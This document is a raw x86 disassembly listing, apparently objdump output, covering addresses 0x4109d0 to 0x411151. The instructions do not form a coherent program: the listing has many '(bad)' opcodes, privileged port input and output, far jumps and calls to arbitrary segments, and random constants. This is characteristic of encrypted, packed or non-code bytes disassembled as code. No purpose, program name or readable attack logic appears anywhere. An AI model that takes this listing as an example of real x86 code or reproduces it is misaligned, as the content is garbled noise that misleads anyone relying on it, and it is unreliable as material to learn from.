  4109d0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4109d1:	(bad)  
  4109d2:	sbb    bh,BYTE PTR [edi]
  4109d4:	push   esp
  4109d5:	jne    0x4109e1
  4109d7:	jg     0x410a35
  4109d9:	ret    
  4109da:	out    dx,al
  4109db:	adc    BYTE PTR [edi-0x6d],dl
  4109de:	cmp    al,0x74
  4109e0:	push   ebp
  4109e1:	pavgw  mm2,QWORD PTR [edx-0x57]
  4109e5:	push   ds
  4109e6:	pop    es
  4109e7:	(bad)  
  4109e8:	ficomp DWORD PTR [esi-0x435bc2dc]
  4109ee:	jnp    0x410a52
  4109f0:	mov    esi,0x3a7c1519
  4109f5:	icebp  
  4109f6:	shr    BYTE PTR [eax+0x3e9a6071],1
  4109fc:	cmp    eax,ebp
  4109fe:	sub    cl,BYTE PTR [edx-0x21]
  410a01:	push   edx
  410a02:	dec    edx
  410a03:	rcr    DWORD PTR [esi-0x247fd0db],0x4a
  410a0a:	stc    
  410a0b:	dec    ebx
  410a0c:	fsubr  QWORD PTR ds:0x3729a536
  410a12:	mov    bh,0x48
  410a14:	mov    bh,0xc
  410a16:	ds sbb al,0x47
  410a19:	or     al,BYTE PTR [esi]
  410a1b:	jl     0x4109ff
  410a1d:	leave  
  410a1e:	std    
  410a1f:	cmp    ebp,DWORD PTR [edi-0x2f]
  410a22:	xchg   esi,eax
  410a23:	in     al,dx
  410a24:	sbb    al,0xf8
  410a26:	fld    DWORD PTR [eax-0x5dec8a62]
  410a2c:	out    dx,al
  410a2d:	xchg   ebx,eax
  410a2e:	rcl    BYTE PTR [esi],cl
  410a30:	ficomp WORD PTR [ebx+0x67]
  410a33:	or     bl,BYTE PTR [edi-0x55]
  410a36:	push   edx
  410a37:	rcr    eax,1
  410a39:	inc    ebx
  410a3a:	xor    esp,DWORD PTR ds:0xecb66a38
  410a40:	out    dx,al
  410a41:	mov    ah,0x59
  410a43:	in     eax,0x3c
  410a45:	repnz retf 0x19a2
  410a49:	sub    al,0x84
  410a4b:	or     al,0xd2
  410a4d:	xor    DWORD PTR [ecx],eax
  410a4f:	jnp    0x410ab3
  410a51:	ds dec ebx
  410a53:	retf   
  410a54:	mov    dl,0x18
  410a56:	daa    
  410a57:	adc    DWORD PTR [edi+0x3a64011b],ebx
  410a5d:	mov    cl,0xe2
  410a5f:	or     eax,0x5e45c5c4
  410a64:	jmp    0x410ac3
  410a66:	aam    0x57
  410a68:	or     BYTE PTR [eax+0x4b],ah
  410a6b:	push   edi
  410a6c:	mov    al,ds:0xd7787cbe
  410a71:	sbb    ebx,DWORD PTR [ebx-0x52]
  410a74:	jns    0x410a96
  410a76:	xchg   BYTE PTR [esi+0x10bb6fa6],bh
  410a7c:	adc    eax,0x4b5cb388
  410a81:	xlat   BYTE PTR ds:[ebx]
  410a82:	int    0x22
  410a84:	jge    0x410a07
  410a86:	push   esp
  410a87:	sub    ebp,DWORD PTR [esi+0x61]
  410a8a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410a8b:	arpl   WORD PTR [esi],di
  410a8d:	loope  0x410a61
  410a8f:	std    
  410a90:	xor    eax,0x52e9fc6d
  410a95:	adc    al,bh
  410a97:	fnstsw WORD PTR [ebx]
  410a99:	adc    DWORD PTR [edi+0x36494183],ecx
  410a9f:	push   0x9ad2f825
  410aa4:	mov    ah,0xc3
  410aa6:	test   eax,0xa0a3b4d9
  410aab:	cwde   
  410aac:	jae    0x410ad3
  410aae:	pop    ds
  410aaf:	into   
  410ab0:	cwde   
  410ab1:	int3   
  410ab2:	adc    DWORD PTR [edx-0x2c],esi
  410ab5:	test   DWORD PTR [edi-0x32b29302],edi
  410abb:	das    
  410abc:	pop    esi
  410abd:	mov    esi,0xa6856425
  410ac2:	sbb    BYTE PTR [edi-0x7c71b7b8],ch
  410ac8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410ac9:	enter  0xd672,0x96
  410acd:	inc    edx
  410ace:	test   DWORD PTR [ecx-0x6a],edi
  410ad1:	push   esp
  410ad2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410ad3:	and    dl,0xe
  410ad6:	sbb    al,0x7e
  410ad8:	xor    BYTE PTR [ebp+0x97dc114],ah
  410ade:	stos   DWORD PTR es:[edi],eax
  410adf:	repz lahf 
  410ae1:	nop
  410ae2:	ins    BYTE PTR es:[edi],dx
  410ae3:	mov    ebx,0x9b88c8f5
  410ae8:	clc    
  410ae9:	(bad)  
  410aea:	lock cmp al,0xcc
  410aed:	or     al,0x15
  410aef:	mov    al,ds:0x9155cb9a
  410af4:	imul   esi,DWORD PTR [eax],0xffffffc5
  410af7:	mov    bh,0x53
  410af9:	loop   0x410b1f
  410afb:	test   al,0xe0
  410afd:	adc    eax,0xd77c9a82
  410b02:	fmul   QWORD PTR [esi-0x8d84b55]
  410b08:	je     0x410b1d
  410b0a:	ret    
  410b0b:	and    eax,0xe2656da5
  410b10:	sti    
  410b11:	pushf  
  410b12:	lahf   
  410b13:	sbb    edi,DWORD PTR [ebp-0x56]
  410b16:	dec    ebp
  410b17:	and    BYTE PTR [ecx*1+0x46afc6b5],0x87
  410b1f:	fld    QWORD PTR [edx+0x11]
  410b22:	stos   BYTE PTR es:[edi],al
  410b23:	test   BYTE PTR [eax],ah
  410b25:	das    
  410b26:	or     DWORD PTR [edi-0x31495b36],esi
  410b2c:	add    al,0x14
  410b2e:	inc    ebx
  410b2f:	jp     0x410b23
  410b31:	aas    
  410b32:	scas   al,BYTE PTR es:[edi]
  410b33:	lea    eax,[ebp+0x19]
  410b36:	js     0x410ac2
  410b38:	out    dx,eax
  410b39:	lods   al,BYTE PTR ds:[esi]
  410b3a:	fidiv  DWORD PTR [ebp-0x39e7a4bf]
  410b40:	add    DWORD PTR [edi+0x56],eax
  410b43:	fwait
  410b44:	mov    ds:0xac892ab9,al
  410b49:	add    eax,0x914b2d94
  410b4e:	add    eax,0xd3827125
  410b53:	(bad)  
  410b54:	mov    bl,BYTE PTR [ecx-0x19a95d06]
  410b5a:	adc    dh,BYTE PTR [ecx]
  410b5c:	cmp    BYTE PTR [ecx-0x1a1f681a],ah
  410b62:	int    0x3b
  410b64:	xchg   ecx,eax
  410b65:	sub    edx,DWORD PTR [esi]
  410b67:	(bad)
  410b6c:	shr    dh,0x40
  410b6f:	xor    eax,0x48546a26
  410b74:	gs aaa 
  410b76:	and    ah,BYTE PTR [edx+0x7da31fcf]
  410b7c:	cmp    dl,cl
  410b7e:	and    DWORD PTR [esi+ebx*4-0x31],eax
  410b82:	mov    ebx,ebp
  410b84:	div    DWORD PTR [edx+0x2f]
  410b87:	into   
  410b88:	sbb    edi,DWORD PTR [esi-0x56]
  410b8b:	imul   ebx,DWORD PTR [esi],0xffffffae
  410b8e:	fdiv   st,st(5)
  410b90:	gs stos DWORD PTR es:[edi],eax
  410b92:	jg     0x410b84
  410b94:	in     al,dx
  410b95:	les    esi,FWORD PTR [edx]
  410b97:	pop    ebx
  410b98:	js     0x410b48
  410b9a:	pop    esp
  410b9b:	mov    cl,BYTE PTR [ebp+0x182a436a]
  410ba1:	fwait
  410ba2:	outs   dx,DWORD PTR ds:[esi]
  410ba4:	push   edi
  410ba5:	xor    eax,0x973931f0
  410baa:	push   ebx
  410bab:	leave  
  410bac:	mov    al,0xd
  410bae:	std    
  410baf:	pop    ebp
  410bb0:	add    edi,DWORD PTR gs:[ebx-0x67]
  410bb4:	xchg   ecx,eax
  410bb5:	push   ebx
  410bb6:	ds pop edx
  410bb8:	imul   edx
  410bba:	mov    cl,0x2a
  410bbc:	xchg   ecx,eax
  410bbd:	jno    0x410b42
  410bbf:	fbld   TBYTE PTR [ebx-0x6a]
  410bc2:	fs das 
  410bc4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410bc5:	repz or BYTE PTR [ebx-0x18],ah
  410bc9:	das    
  410bca:	pushf  
  410bcb:	rcl    DWORD PTR [ebp-0x107eb002],0xa5
  410bd2:	xchg   dx,ax
  410bd4:	lods   eax,DWORD PTR ds:[esi]
  410bd5:	scas   al,BYTE PTR es:[edi]
  410bd6:	adc    BYTE PTR ds:0x860921,bl
  410bdc:	jae    0x410b6b
  410bde:	test   eax,0x2fac8c62
  410be3:	lock push esp
  410be5:	call   0x74646b33
  410bea:	std    
  410beb:	mov    dh,0x5d
  410bed:	imul   eax,DWORD PTR [edx+eiz*8-0x8400b4b],0xd3803ab5
  410bf8:	push   0x95003b98
  410bfd:	mov    ah,dl
  410bff:	inc    esp
  410c00:	js     0x410c30
  410c02:	dec    ecx
  410c03:	jp     0x410c7f
  410c05:	sub    DWORD PTR [eax+0x17ca1faf],ebp
  410c0b:	and    bl,BYTE PTR ds:0x7c9e1912
  410c11:	or     eax,0xd195a3d4
  410c16:	fsubrp st(6),st
  410c18:	inc    eax
  410c19:	inc    ebp
  410c1a:	sbb    DWORD PTR [esi-0x1a],0xffffffc7
  410c1e:	xchg   ecx,eax
  410c1f:	mov    ds:0x90ddacf2,eax
  410c24:	shl    DWORD PTR [esi+0xa78f496],cl
  410c2a:	retf   
  410c2b:	lods   eax,DWORD PTR ds:[esi]
  410c2c:	or     eax,0xeff8de3f
  410c31:	lahf   
  410c32:	or     bh,dl
  410c34:	fld    TBYTE PTR [ebp+0x530b1047]
  410c3a:	inc    edi
  410c3b:	dec    edx
  410c3c:	jg     0x410bde
  410c3e:	xlat   BYTE PTR ds:[ebx]
  410c3f:	xchg   esi,eax
  410c40:	mov    ebp,0x9f319ba3
  410c45:	xor    eax,0xccfb5b2f
  410c4a:	sbb    bl,BYTE PTR [eax+0x33]
  410c4d:	scas   al,BYTE PTR es:[edi]
  410c4e:	cmp    al,0xed
  410c50:	cld    
  410c51:	jge    0x410c9a
  410c53:	hlt    
  410c54:	cmp    al,0xbf
  410c56:	dec    esi
  410c57:	adc    BYTE PTR [ebx],dl
  410c59:	in     eax,0x3c
  410c5b:	das    
  410c5c:	sahf   
  410c5d:	add    cl,bh
  410c5f:	inc    edx
  410c60:	jne    0x410c30
  410c62:	and    al,0xdf
  410c64:	mov    edx,0x5915e094
  410c69:	fdiv   st,st(4)
  410c6b:	in     al,dx
  410c6c:	and    DWORD PTR [ebp+0x51],ecx
  410c6f:	inc    edx
  410c70:	mov    esp,0xa7196588
  410c75:	pop    ss
  410c76:	shl    DWORD PTR [ebx],1
  410c78:	inc    ebp
  410c79:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410c7a:	(bad)  
  410c7b:	popa   
  410c7c:	int    0x7c
  410c7e:	outs   dx,BYTE PTR ds:[esi]
  410c7f:	or     al,0xbb
  410c81:	adc    DWORD PTR [ecx-0x34],esp
  410c84:	dec    ecx
  410c85:	and    esp,edi
  410c87:	pop    ecx
  410c88:	shr    edx,cl
  410c8a:	pop    esp
  410c8b:	inc    esi
  410c8c:	cld    
  410c8d:	repnz fmulp st(0),st
  410c90:	add    eax,0x72bcf716
  410c95:	or     BYTE PTR [edi+0x33],ah
  410c98:	or     BYTE PTR [esi-0x66],ah
  410c9b:	(bad)  
  410c9c:	pusha  
  410c9d:	sbb    al,0x56
  410c9f:	cwde   
  410ca0:	jmp    0x410cd3
  410ca2:	enter  0xc158,0x7
  410ca6:	inc    edx
  410ca7:	dec    ebp
  410ca8:	dec    edx
  410ca9:	add    al,ah
  410cab:	(bad)  ds:0x90314b83
  410cb1:	fwait
  410cb2:	nop
  410cb3:	ficomp WORD PTR [esi]
  410cb5:	fwait
  410cb6:	mov    WORD PTR [edi-0x2e],?
  410cb9:	mov    bh,0x2a
  410cbb:	mov    cl,BYTE PTR [ebp-0x7c2f50be]
  410cc1:	clc    
  410cc2:	xchg   ecx,eax
  410cc3:	jl     0x410c86
  410cc5:	add    dl,bh
  410cc7:	nop
  410cc8:	jecxz  0x410cc7
  410cca:	aaa    
  410ccb:	push   ebx
  410ccc:	ins    BYTE PTR es:[edi],dx
  410ccd:	outs   dx,BYTE PTR ds:[esi]
  410cce:	xchg   edi,eax
  410ccf:	push   ss
  410cd0:	retf   0x4dee
  410cd3:	mov    al,ds:0x6b574a3
  410cd8:	jl     0x410cef
  410cda:	mov    esp,0xddc318c2
  410cdf:	stc    
  410ce0:	inc    ebp
  410ce1:	imul   edx
  410ce3:	mov    si,0xd2b4
  410ce7:	xchg   ebp,eax
  410ce8:	xor    eax,0x1dec70d4
  410ced:	jb     0x410d06
  410cef:	shl    ah,cl
  410cf1:	cwde   
  410cf2:	mov    dl,0xce
  410cf4:	jne    0x410cf6
  410cf6:	pop    esi
  410cf7:	adc    al,0x17
  410cf9:	clc    
  410cfa:	sar    BYTE PTR [ebp+0x4f],1
  410cfd:	loopne 0x410d0a
  410cff:	addr16 adc eax,0xa5df45df
  410d05:	mov    edi,0x73a00e9e
  410d0a:	mov    ch,0x2a
  410d0c:	jmp    0x4d1c9adb
  410d11:	sub    edx,esi
  410d13:	or     BYTE PTR [edi+0x48],ah
  410d16:	hlt    
  410d17:	sbb    ecx,esi
  410d19:	and    eax,0x67bf73d2
  410d1e:	add    BYTE PTR [ebx-0x8],al
  410d21:	out    dx,al
  410d22:	test   al,0x1e
  410d24:	shr    DWORD PTR [eax],cl
  410d26:	dec    edx
  410d27:	lds    edx,FWORD PTR [ecx-0x6db27cd]
  410d2d:	pop    ecx
  410d2e:	jmp    0x410cb8
  410d30:	xchg   ebx,eax
  410d31:	mov    al,ds:0xc368ea02
  410d36:	leave  
  410d37:	into   
  410d38:	popf   
  410d39:	add    eax,0xbba07598
  410d3e:	rcl    BYTE PTR [ecx],cl
  410d40:	mov    ecx,0x88786c19
  410d45:	push   edx
  410d46:	add    ecx,0xffffffe2
  410d49:	jecxz  0x410d7b
  410d4b:	test   al,0xe5
  410d4d:	out    0xb9,eax
  410d4f:	pop    ecx
  410d50:	adc    BYTE PTR [ebp+0x29c6d275],ch
  410d56:	mov    ebx,0x29b98feb
  410d5b:	add    DWORD PTR [edi],0xffffffb7
  410d5e:	adc    bh,BYTE PTR [edx-0x3be988b4]
  410d64:	push   edi
  410d65:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410d66:	outs   dx,BYTE PTR ds:[esi]
  410d67:	pop    eax
  410d68:	jle    0x410dac
  410d6a:	fs repnz sub al,ah
  410d6e:	std    
  410d6f:	dec    ebx
  410d70:	jmp    0x410daf
  410d72:	sti    
  410d73:	int3   
  410d74:	jge    0x410da4
  410d76:	inc    ebx
  410d77:	xchg   DWORD PTR [ebx+0x20],eax
  410d7a:	rol    BYTE PTR [ebx+eax*8+0x61],0xa5
  410d7f:	(bad)  
  410d81:	(bad)  [ebp+0x5a]
  410d84:	pushf  
  410d85:	mov    esp,edx
  410d87:	pop    ss
  410d88:	push   ebx
  410d89:	push   ss
  410d8a:	lock jo 0x410d62
  410d8d:	jge    0x410e08
  410d8f:	adc    ebx,DWORD PTR [edx-0xb6d06c5]
  410d95:	mov    al,ds:0xbbfa6507
  410d9a:	jb     0x410d2a
  410d9c:	je     0x410d8c
  410d9e:	arpl   si,cx
  410da0:	pop    edx
  410da1:	lods   al,BYTE PTR ds:[esi]
  410da2:	mov    bh,0x1c
  410da4:	lea    edi,[esi-0x15c7b3e3]
  410daa:	cmp    BYTE PTR [eax-0x191a18e],dh
  410db0:	dec    ebx
  410db1:	hlt    
  410db2:	sub    DWORD PTR [edi+0x17ae93af],ecx
  410db8:	bound  edx,QWORD PTR [ecx+0x1b298ca4]
  410dbe:	jne    0x410d64
  410dc0:	dec    esp
  410dc1:	lock fadd DWORD PTR [esi-0x3038cd1f]
  410dc8:	push   ds
  410dc9:	and    DWORD PTR [edi+0x13],0x73543923
  410dd0:	shr    DWORD PTR [ecx],0xf0
  410dd3:	aaa    
  410dd4:	in     al,0x1a
  410dd6:	sub    ecx,DWORD PTR [edi+0x77]
  410dd9:	dec    ecx
  410dda:	cs call 0x66d928f1
  410de0:	test   eax,0x83ee10cc
  410de5:	mov    ds:0xf6c12c,eax
  410dea:	xor    dh,BYTE PTR [ebx]
  410dec:	sub    al,0x92
  410dee:	push   eax
  410def:	or     eax,0x2def7d43
  410df4:	sub    ch,BYTE PTR [ecx-0x78]
  410df7:	mov    al,0xa7
  410df9:	js     0x410e23
  410dfb:	inc    ebp
  410dfc:	cmc    
  410dfd:	imul   ebx,DWORD PTR [edi+0x39],0x36
  410e01:	int3   
  410e02:	pop    ebp
  410e03:	xchg   esi,eax
  410e04:	xchg   DWORD PTR [ebx+0x30389944],ebp
  410e0a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410e0b:	stos   DWORD PTR es:[edi],eax
  410e0c:	adc    esi,ebp
  410e0e:	and    ebx,DWORD PTR [eax+edx*4+0x1974eeca]
  410e15:	sbb    dh,BYTE PTR [eax+0x53]
  410e18:	mov    bh,0x73
  410e1a:	mov    edx,0x722392ac
  410e1f:	loopne 0x410e29
  410e21:	mov    edi,edx
  410e23:	ds push ebx
  410e25:	jo     0x410e37
  410e27:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410e28:	aam    0xe3
  410e2a:	xor    esp,ecx
  410e2c:	jecxz  0x410dfc
  410e2e:	or     al,0x4b
  410e30:	sbb    eax,0xa73c3bf3
  410e35:	je     0x410e31
  410e37:	int    0xe
  410e39:	out    0xd0,eax
  410e3b:	sar    esi,cl
  410e3d:	add    BYTE PTR [ecx+0x4e],0xa1
  410e41:	and    BYTE PTR [ecx],dl
  410e43:	in     eax,0x69
  410e45:	cmp    DWORD PTR [esp+eax*8-0x329f1ab],esi
  410e4c:	repz mov eax,0x7b17305d
  410e52:	jns    0x410dfc
  410e54:	xor    al,0x81
  410e56:	jl     0x410e37
  410e58:	mov    ebp,0xd7921578
  410e5d:	in     al,dx
  410e5e:	mov    ch,0xa4
  410e60:	repz cmp ebp,edi
  410e63:	xchg   bl,bl
  410e65:	jns    0x410ded
  410e67:	mov    DWORD PTR [eax+0x52],eax
  410e6a:	in     eax,dx
  410e6b:	inc    edx
  410e6c:	shl    BYTE PTR [esi-0x20],0x93
  410e70:	inc    ecx
  410e71:	pop    es
  410e72:	and    al,0x38
  410e74:	mov    al,ds:0x7b908f54
  410e79:	sbb    BYTE PTR [edx],cl
  410e7b:	mov    ebp,0x3ab23906
  410e80:	jb     0x410ee1
  410e82:	call   0xe35c:0xbe0a0e5d
  410e89:	sub    eax,DWORD PTR ds:0x588c53cd
  410e8f:	dec    edi
  410e90:	pop    ecx
  410e91:	xchg   ebp,eax
  410e92:	stos   DWORD PTR es:[edi],eax
  410e93:	rcr    ch,cl
  410e95:	mov    ds:0xe41539ea,eax
  410e9a:	cdq    
  410e9b:	xchg   ebp,eax
  410e9c:	(bad)  
  410e9d:	in     al,0xea
  410e9f:	mov    BYTE PTR [ebp+0x71bdaef8],dl
  410ea5:	sub    esi,DWORD PTR [edi-0x2a]
  410ea8:	fisttp DWORD PTR [esi+0x131ca7f]
  410eae:	jbe    0x410e63
  410eb0:	cmp    ecx,esp
  410eb2:	mov    dh,BYTE PTR ds:0x20b96637
  410eb8:	inc    edx
  410eb9:	jmp    0xa272:0xd8dd9311
  410ec0:	idiv   BYTE PTR [edi+ecx*8-0x4c]
  410ec4:	stos   DWORD PTR es:[edi],eax
  410ec5:	sar    BYTE PTR [ebp+0x7b],1
  410ec8:	push   edx
  410ec9:	cs retf 
  410ecb:	shl    DWORD PTR [eax],1
  410ecd:	cmp    BYTE PTR [esi+0x26],bl
  410ed0:	aam    0x2c
  410ed2:	(bad)  
  410ed3:	cmp    BYTE PTR [edx-0x3b],al
  410ed6:	add    al,0x90
  410ed8:	scas   al,BYTE PTR es:[edi]
  410ed9:	xor    BYTE PTR [eax+edx*1-0x3b],ch
  410edd:	sbb    dl,ah
  410edf:	mov    dh,0xec
  410ee1:	aaa    
  410ee2:	push   edi
  410ee3:	mov    eax,edi
  410ee5:	pop    ds
  410ee6:	jo     0x410ed6
  410ee8:	mov    cl,0xfd
  410eea:	pop    esp
  410eeb:	test   BYTE PTR [edi+ebp*2],ah
  410eee:	or     al,0x3d
  410ef0:	sub    eax,0xc555dc47
  410ef5:	xchg   esp,eax
  410ef6:	(bad)  
  410ef7:	jns    0x410f6e
  410ef9:	pop    esp
  410efa:	fs lahf 
  410efc:	popa   
  410efd:	inc    ecx
  410efe:	or     esp,edx
  410f00:	jmp    0x410f47
  410f02:	nop
  410f03:	mov    ah,0xa6
  410f05:	mov    al,0x7e
  410f07:	leave  
  410f08:	jmp    0x410eab
  410f0a:	mov    DWORD PTR [edi],ebx
  410f0c:	mov    WORD PTR [esp+edi*2-0x2c],fs
  410f10:	jle    0x410e9c
  410f12:	mov    cl,0x93
  410f14:	es cmp al,0xcf
  410f17:	(bad)  
  410f18:	(bad)  
  410f19:	mov    ebp,0xed62ac2b
  410f1e:	xchg   ebp,eax
  410f1f:	(bad)  
  410f20:	or     eax,0x7a81e211
  410f25:	jle    0x410f32
  410f27:	outs   dx,DWORD PTR ds:[esi]
  410f28:	mov    eax,0x9dcce602
  410f2d:	inc    ebp
  410f2e:	sar    al,cl
  410f30:	xchg   esi,eax
  410f31:	mov    WORD PTR [edx+esi*1+0x71],ss
  410f35:	adc    dl,bh
  410f37:	jae    0x410f82
  410f39:	add    BYTE PTR [edi],dh
  410f3b:	das    
  410f3c:	inc    ebx
  410f3d:	mov    BYTE PTR ss:[edx+0x40],dh
  410f41:	inc    ebx
  410f42:	aaa    
  410f43:	aam    0xad
  410f45:	inc    ebx
  410f46:	sub    al,0xfc
  410f48:	sub    eax,0x5a7f0bb0
  410f4d:	in     al,dx
  410f4e:	inc    ebp
  410f4f:	add    ecx,DWORD PTR [ebp+0x7e]
  410f52:	bound  edi,QWORD PTR [edi]
  410f54:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410f55:	call   0x54b8:0xa1276ff9
  410f5c:	dec    ebx
  410f5d:	mov    dh,0x3a
  410f5f:	sub    DWORD PTR [ecx],0x29
  410f62:	(bad)  
  410f65:	xchg   BYTE PTR [ebx+edx*2-0x62a2a75c],cl
  410f6c:	clc    
  410f6d:	pop    ds
  410f6e:	pop    ecx
  410f6f:	scas   al,BYTE PTR es:[edi]
  410f70:	into   
  410f71:	push   ebp
  410f72:	mov    ecx,0x6e691c72
  410f77:	sar    DWORD PTR [edx+0x61ef4690],1
  410f7d:	pop    esp
  410f7e:	inc    esi
  410f7f:	cmp    eax,0x6e191e01
  410f84:	outs   dx,BYTE PTR ds:[esi]
  410f85:	pop    edi
  410f86:	sbb    eax,0x8bc8aa25
  410f8b:	sbb    DWORD PTR [eax],ecx
  410f8d:	jp     0x410f71
  410f8f:	add    eax,DWORD PTR [eax]
  410f91:	loopne 0x411008
  410f93:	arpl   sp,dx
  410f95:	stc    
  410f96:	hlt    
  410f97:	imul   esp,DWORD PTR [eax-0x3c5a1190],0xffffff81
  410f9e:	les    edi,FWORD PTR [ebx]
  410fa0:	aam    0x7c
  410fa2:	pop    esp
  410fa3:	adc    DWORD PTR [edi+ecx*4+0x1b1bc687],edi
  410faa:	arpl   WORD PTR [edx+0x3d],di
  410fad:	push   ebp
  410fae:	mov    fs,WORD PTR [edx+edi*4+0x3c]
  410fb2:	xor    bl,BYTE PTR [bx-0x2b]
  410fb6:	inc    ecx
  410fb8:	push   ss
  410fb9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410fba:	sub    esi,esp
  410fbc:	scas   eax,DWORD PTR es:[edi]
  410fbd:	in     al,dx
  410fbe:	push   ss
  410fbf:	out    dx,al
  410fc0:	int3   
  410fc1:	mov    eax,0xf9c19593
  410fc6:	add    ebx,ecx
  410fc8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410fc9:	push   esi
  410fca:	jmp    0xf9a98a99
  410fcf:	xor    BYTE PTR [ecx+0x65ed2021],cl
  410fd5:	add    BYTE PTR [ecx+0x32a53da9],dh
  410fdb:	int3   
  410fdc:	inc    ebp
  410fdd:	pop    edx
  410fde:	mov    edx,0x12163a62
  410fe3:	aaa    
  410fe4:	xor    ebp,DWORD PTR [ebx]
  410fe6:	aas    
  410fe7:	sti    
  410fe8:	scas   al,BYTE PTR es:[edi]
  410fe9:	mov    bh,0xea
  410feb:	sbb    ah,0xaa
  410fee:	jb     0x41106d
  410ff0:	pop    edi
  410ff1:	push   ebp
  410ff2:	int    0xc4
  410ff4:	(bad)  
  410ff6:	cmp    al,0x69
  410ff8:	jmp    0x41106e
  410ffa:	in     eax,dx
  410ffb:	loopne 0x410fd2
  410ffd:	test   eax,0x46d193db
  411002:	add    edi,DWORD PTR [eax-0xb]
  411005:	xchg   esp,eax
  411006:	das    
  411007:	mov    al,0x11
  411009:	pop    ecx
  41100a:	int    0x6d
  41100c:	data16 mov bh,0xb8
  41100f:	push   0xccd9bd65
  411014:	ins    DWORD PTR es:[edi],dx
  411015:	dec    esp
  411016:	sbb    esp,DWORD PTR [edx+0x3e9fcfa]
  41101c:	sub    edx,DWORD PTR [ecx+0x61]
  41101f:	push   0x94f78cfd
  411024:	cdq    
  411025:	sbb    DWORD PTR [esp+edi*8+0x5ccef960],ebp
  41102c:	sti    
  41102d:	sbb    ch,BYTE PTR [edx]
  41102f:	push   cs
  411030:	fsub   DWORD PTR [esi-0x5d]
  411033:	out    dx,al
  411034:	repnz fcom QWORD PTR [ebx]
  411037:	rol    BYTE PTR [eax-0x55],1
  41103a:	ss dec ecx
  41103c:	cdq    
  41103d:	ins    DWORD PTR es:[edi],dx
  41103e:	stos   DWORD PTR es:[edi],eax
  41103f:	dec    ebx
  411040:	repnz mov al,0x7f
  411043:	mov    al,dh
  411045:	lar    edi,WORD PTR [ebx+0x34d6277d]
  41104c:	mov    eax,0xf86d5e43
  411051:	shl    DWORD PTR [ebp-0x5b],cl
  411054:	fild   QWORD PTR [edi-0x3e6d4c5f]
  41105a:	mov    dh,0x29
  41105c:	mov    eax,0x5259c40a
  411061:	sub    DWORD PTR [eax+0x4d],eax
  411064:	shl    DWORD PTR [ebp-0x56311c7c],0xd3
  41106b:	pushf  
  41106c:	adc    DWORD PTR [edi+esi*2+0x181b6f85],esp
  411073:	fild   QWORD PTR [edx]
  411075:	mov    ch,BYTE PTR [esi+0x6c]
  411078:	jge    0x41101e
  41107a:	xchg   esp,eax
  41107b:	or     eax,0x2bdeba76
  411080:	jne    0x4110c3
  411082:	call   0xae9b:0x774c5e4b
  411089:	push   esp
  41108a:	pop    es
  41108b:	cmp    al,0xb
  41108d:	ja     0x411093
  41108f:	ins    BYTE PTR es:[edi],dx
  411090:	mov    eax,ds:0xde35123e
  411095:	outs   dx,BYTE PTR ds:[esi]
  411096:	sub    eax,0xf742e9b9
  41109b:	push   esi
  41109c:	bound  esp,QWORD PTR [ecx+0x890fb63]
  4110a2:	cmp    ecx,DWORD PTR [edx-0x6e]
  4110a5:	adc    eax,0x248da8b2
  4110aa:	mov    ah,0x7a
  4110ac:	sti    
  4110ad:	or     eax,0x2aad597b
  4110b2:	fistp  WORD PTR [esi+0x27]
  4110b5:	scas   al,BYTE PTR es:[edi]
  4110b6:	mov    ds:0xc41b3ebd,al
  4110bb:	sar    al,0xc6
  4110be:	jbe    0x411122
  4110c0:	mov    eax,ds:0x14e81760
  4110c5:	(bad)  
  4110c6:	rcl    DWORD PTR [edx-0x32f86769],1
  4110cc:	xchg   edi,eax
  4110cd:	cli    
  4110ce:	sbb    eax,0x4d1ea324
  4110d3:	nop
  4110d4:	jge    0x411155
  4110d6:	bound  edx,QWORD PTR [esi]
  4110d8:	ins    BYTE PTR es:[edi],dx
  4110d9:	jle    0x411123
  4110db:	loope  0x4110ec
  4110dd:	xchg   edx,eax
  4110de:	fdiv   QWORD PTR [edx-0x409eb83a]
  4110e4:	fs dec ecx
  4110e6:	in     eax,dx
  4110e7:	dec    ecx
  4110e8:	retf   0xf732
  4110eb:	sbb    BYTE PTR [ecx],dl
  4110ed:	sbb    ch,BYTE PTR fs:[ebx+0x10]
  4110f1:	sub    al,0x27
  4110f3:	cwde   
  4110f4:	lods   al,BYTE PTR ds:[esi]
  4110f5:	jo     0x411123
  4110f7:	stos   BYTE PTR es:[edi],al
  4110f8:	dec    eax
  4110f9:	pop    es
  4110fa:	mov    ebx,0xf2876d87
  4110ff:	ins    BYTE PTR es:[edi],dx
  411100:	and    cl,BYTE PTR [esi]
  411102:	xor    DWORD PTR [eax],edi
  411104:	(bad)  
  411106:	mov    dl,0x14
  411108:	cmc    
  411109:	dec    ecx
  41110a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41110b:	leave  
  41110c:	inc    edi
  41110d:	sub    BYTE PTR [eax+0x40],bh
  411110:	(bad)  
  411111:	das    
  411112:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411114:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411115:	inc    esp
  411116:	mov    cl,0x20
  411118:	xor    al,0xf7
  41111a:	imul   edi,edi,0xffffffc7
  41111d:	mov    cl,0x82
  41111f:	not    DWORD PTR [ecx+edi*8+0x182904f8]
  411126:	repz mov eax,0x38a68937
  41112c:	add    al,0xa0
  41112e:	mov    ah,0x82
  411130:	dec    ecx
  411131:	and    eax,0x492ba31b
  411136:	imul   ecx,DWORD PTR [eax+0x20],0x34
  41113a:	jnp    0x4110e7
  41113c:	in     al,0x37
  41113e:	push   eax
  41113f:	pop    ebp
  411140:	fwait
  411141:	and    al,0x55
  411143:	test   al,0x8
  411145:	dec    ebp
  411146:	rcr    DWORD PTR [ebx],1
  411148:	xchg   ecx,eax
  411149:	fstp   QWORD PTR [edx]
  41114b:	dec    esi
  41114c:	iret   
  41114d:	lods   al,BYTE PTR ds:[esi]
  41114e:	push   eax
  41114f:	repz dec ecx
  411151:	dec    esp
